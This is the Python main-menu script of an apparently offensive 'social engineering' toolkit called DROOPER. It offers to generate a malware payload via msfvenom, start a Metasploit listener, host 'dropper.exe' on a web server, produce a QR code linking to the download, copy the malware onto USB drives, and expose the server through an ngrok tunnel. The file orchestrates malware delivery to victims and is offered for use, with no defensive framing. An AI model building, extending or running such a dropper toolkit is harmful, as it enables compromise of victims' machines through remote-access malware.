import sys
import os
import time
from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt
from rich.text import Text
from rich.progress import Progress, SpinnerColumn, TextColumn

from app.core.utils import get_local_ip
from app.core.payload import generate_payload, generate_qr_code
from app.core.listener import start_listener
from app.core.usb import copy_to_usb
from app.web.server import start_web_server, start_ngrok_tunnel

console = Console()

from pyfiglet import Figlet

def print_banner():
    console.clear()
    f = Figlet(font='slant')
    banner_text = f.renderText('DROOPER')
    console.print(f"[bold green]{banner_text}[/bold green]", justify="center")
    console.print("[bold yellow]A Social Engineering Tool By AJVAD-N[/bold yellow]", justify="center")
    console.print("[bold red]----------------------------------------[/bold red]", justify="center")


def main_menu():
    while True:
        print_banner()
        console.print(Panel.fit(
            "[1] Create Malware Payload\n"
            "[2] Start Metasploit Listener\n"
            "[3] Start Web Hosting Service\n"
            "[4] Generate Malware QR Code\n"
            "[5] Copy Malware to USB\n"
            "[6] Start Ngrok Tunnel\n"
            "[7] Exit",
            title="[bold cyan]Main Menu[/bold cyan]",
            border_style="blue"
        ))

        choice = Prompt.ask("[bold cyan]Select an option[/bold cyan]", choices=["1", "2", "3", "4", "5", "6", "7"])

        if choice == "1":
            lhost = get_local_ip()
            console.print(f"[+] Detected Local IP: [bold green]{lhost}[/bold green]")
            custom_ip = Prompt.ask("Enter LHOST (Press Enter to use detected IP)", default=lhost)
            
            with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), transient=True) as progress:
                progress.add_task(description="Generating payload...", total=None)
                path = generate_payload(custom_ip)
            
            if path:
                console.print(f"[bold green][+] Payload saved as: {path}[/bold green]")
            else:
                console.print("[bold red][!] Failed to generate payload. Ensure msfvenom is installed.[/bold red]")
            Prompt.ask("\nPress Enter to continue...")

        elif choice == "2":
            console.print("[yellow][*] Starting Listener in new tab...[/yellow]")
            start_listener(new_tab=True)
            Prompt.ask("\nPress Enter to return to menu...")

        elif choice == "3":
            console.print("[yellow][*] Starting Web Server on port 8080...[/yellow]")
            start_web_server()
            console.print("[bold green][+] Web server running at http://0.0.0.0:8080[/bold green]")
            Prompt.ask("\nPress Enter to return to menu (Server runs in background)...")

        elif choice == "4":
            lhost = get_local_ip()
            link = f"http://{lhost}:8080/download/dropper.exe"
            console.print(f"[+] Default Link: [bold blue]{link}[/bold blue]")
            custom_link = Prompt.ask("Enter Link (Press Enter to use default)", default=link)
            
            path = generate_qr_code(custom_link)
            console.print(f"[bold green][+] QR Code saved at: {path}[/bold green]")
            Prompt.ask("\nPress Enter to continue...")

        elif choice == "5":
            with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), transient=True) as progress:
                progress.add_task(description="Searching for USB drives...", total=None)
                success, msg = copy_to_usb()
            
            if success:
                console.print(f"[bold green][+] {msg}[/bold green]")
            else:
                console.print(f"[bold red][!] {msg}[/bold red]")
            Prompt.ask("\nPress Enter to continue...")

        elif choice == "6":
            console.print("[yellow][*] Starting Ngrok...[/yellow]")
            
            # Check for ngrok authtoken
            # This is a simple check, a more robust one would check ngrok config file
            print("[*] Checking for Ngrok configuration...")
            
            # Try to start ngrok and capture output to see if it fails due to auth
            # Actually, better to just ask user if they want to configure it
            console.print("[bold red]NOTE: Ngrok requires an authtoken to work.[/bold red]")
            console.print("Get one here: [link=https://dashboard.ngrok.com/signup]https://dashboard.ngrok.com/signup[/link]")
            
            if Prompt.ask("Do you want to configure Ngrok Authtoken?", choices=["y", "n"], default="n") == "y":
                token = Prompt.ask("Enter your Ngrok Authtoken")
                
                from pyngrok import conf, ngrok
                if not os.path.exists(conf.get_default().ngrok_path):
                    ngrok.install_ngrok()
                
                ngrok_path = conf.get_default().ngrok_path
                os.system(f"{ngrok_path} config add-authtoken {token}")
            
            start_ngrok_tunnel(new_tab=True)
            console.print("[bold green][+] Ngrok started in new tab.[/bold green]")
            Prompt.ask("\nPress Enter to return to menu...")

        elif choice == "7":
            console.print("[bold green]Exiting... Happy Hacking![/bold green]")
            sys.exit()
